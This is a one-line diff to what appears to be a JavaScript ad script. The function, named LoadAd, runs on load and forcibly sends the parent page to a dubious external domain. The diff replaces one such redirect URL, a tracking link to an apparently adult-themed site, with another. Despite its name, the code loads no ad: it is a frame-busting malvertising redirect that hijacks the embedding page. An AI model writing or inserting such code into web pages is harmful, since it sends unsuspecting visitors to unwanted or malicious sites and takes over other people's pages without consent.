@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://jdbqg.giirlshouse.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=1088697&s3=Aeil"; } LoadAd();
+function LoadAd() { parent.location.href="https://privtdm.com/goesme"; } LoadAd();
